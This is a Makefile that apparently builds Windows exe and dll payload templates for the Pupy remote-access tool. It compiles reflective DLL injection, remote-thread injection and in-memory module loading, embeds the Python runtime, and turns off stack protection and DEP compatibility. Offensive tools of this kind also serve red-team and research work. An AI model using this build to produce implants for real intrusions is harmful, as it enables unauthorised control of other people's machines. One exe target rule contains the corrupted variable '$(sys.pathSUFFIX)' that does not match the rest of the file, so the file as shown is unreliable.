BUILDENV ?= $(PWD)/buildenv
PYTHONPATH := C:\\Python27

TEMPLATE_OUTPUT_PATH=../../pupy/payload_templates

ifndef ARCH
$(error You must specify an architecture - win64 or win32)
endif

CC := $(BUILDENV)/$(ARCH)/cl.sh
PYTHON := $(BUILDENV)/$(ARCH)/python.sh
HOST_PYTHON := python

ifeq "$(ARCH)" "win64"
CFLAGS:=$(CFLAGS) /DWIN_X64 /D_WIN64 /nologo
PPARCH := x64
else
CFLAGS:=$(CFLAGS) /DWIN_X86 /nologo
PPARCH := x86
endif

CFLAGS += /Iresources\\$(ARCH) /Iresources /DHAVE_WINDOW
# CFLAGS += /Iresources\\$(ARCH) /Iresources

ifdef DEBUG
DEBUG_ADD   := -debug
CFLAGS      := $(CFLAGS) /DDEBUG /DVERBOSE
LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:windows /ENTRY:WinMainCRTStartup user32.lib
# LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:console
PPARCH      := $(PPARCH)d
else
DEBUG_ADD   :=
LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:windows /ENTRY:WinMainCRTStartup /LTCG user32.lib
# LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:console /LTCG user32.lib
PPARCH      := $(PPARCH)
CFLAGS      := $(CFLAGS) /Os /GL /GS-
endif

SECARGS     := "cl" ".xzdata"

CFLAGS      := $(CFLAGS) /I..\\common

PYOBJS := \
	MyLoadLibrary.obj \
	pupy_load.obj \
	base_inject.obj

COMMON_OBJS := \
	MemoryModule.obj \
	actctx.obj list.obj thread.obj remote_thread.obj \
	LoadLibraryR.obj

SHARED_OBJS := \
	ReflectiveLoader.obj \
	pupy_shared.obj \
	main_reflective.obj 

APP_OBJS := \
	main_exe.obj \
	pupy.obj

ifeq ($(UNCOMPRESSED),)
COMMON_OBJS += LzmaDec.obj
COMPRESSED = 1
else
CFLAGS += /DUNCOMPRESSED
SUFFIX := unc.$(SUFFIX)
COMPRESSED = 0
endif

all: $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)exe $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)dll

revision.h:
	if [ -z $$COMMIT ]; then rev=$$(cat ../../.git/`cat ../../.git/HEAD | cut -f 2 -d \ ` | cut -c 1-8); \
	 else rev=$$COMMIT; fi; echo "#define GIT_REVISION_HEAD \"$$rev\"" >$@

import-tab.c import-tab.h: ../mktab.py
	$(HOST_PYTHON) $(PFLAGS) $<

resources/$(ARCH)/library.txt: ../gen_library_compressed_string.py resources/$(ARCH)/library.zip
	$(HOST_PYTHON) ../gen_library_compressed_string.py $@ resources/$(ARCH)/library.zip

resources/$(ARCH)/library.zip: ../build_library_zip.py
	$(PYTHON) ../build_library_zip.py $@

resources/$(ARCH)/library.c: ../gen_resource_header.py resources/$(ARCH)/library.txt resources/$(ARCH)/library.zip
	$(HOST_PYTHON) ../gen_resource_header.py resources/$(ARCH)/library.txt $@ $(COMPRESSED) $(SECARGS)

resources/$(ARCH)/python27.dll: $(BUILDENV)/$(ARCH)/drive_c/Python27/python27.dll
	@mkdir -p resources/$(ARCH)
	cp $< $@

resources/$(ARCH)/msvcr90.dll: $(BUILDENV)/$(ARCH)/drive_c/Python27/msvcr90.dll
	@mkdir -p resources/$(ARCH)
	cp $< $@

resources/$(ARCH)/python27.c: resources/$(ARCH)/python27.dll ../gen_resource_header.py
	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)

resources/$(ARCH)/msvcr90.c: resources/$(ARCH)/msvcr90.dll ../gen_resource_header.py
	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)

ifeq ($(UNCOMPRESSED),)
LzmaDec.obj: ../common/LzmaDec.c
	$(CC) /c $(CFLAGS) $< /Fo$@
endif

%.obj: %.c
	$(CC) /Fo$@ /I$(PYTHONPATH)\\include /c $(CFLAGS) $<

%.obj: ../common/%.c
	$(CC) /Fo$@ /I$(PYTHONPATH)\\include /c $(CFLAGS) $<


ReflectiveLoader.obj: ReflectiveLoader.c
	$(CC) /c $(CFLAGS) /DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN \
		/DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR /O2 /Ob1 $< /Fo$@

pupy_load.obj: pupy_load.c resources/$(ARCH)/library.c resources/$(ARCH)/msvcr90.c resources/$(ARCH)/python27.c revision.h

pupy.obj: pupy.c revision.h
	$(CC) /c $(CFLAGS) $< /Fo$@

pupy_shared.obj: pupy.c revision.h
	$(CC) /c $(CFLAGS) /D_PUPY_DLL $< /Fo$@

$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(sys.pathSUFFIX)exe: $(PYOBJS) $(APP_OBJS) $(COMMON_OBJS)
	$(CC) $(CFLAGS) $+ /Fe$@ $(LINKER_OPTS) Shell32.lib
	unzip -p resources/$(ARCH)/library.zip fid.toc >$@.toc

$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)dll: $(PYOBJS) $(SHARED_OBJS) $(COMMON_OBJS)
	$(CC) $(CFLAGS) $+ /Fe$@ /LD Shell32.lib
	unzip -p resources/$(ARCH)/library.zip fid.toc >$@.toc

.PHONY: clean

clean:
	rm -f *.obj
	rm -f $(PYOBJS) $(COMMON_OBJS)

distclean: clean
	rm -f revision.h
	rm -f import-tab.c
	rm -f import-tab.h
	rm -f revision.h
	rm -rf resources

$(COMMON_OBJS) $(PYOBJS): import-tab.h
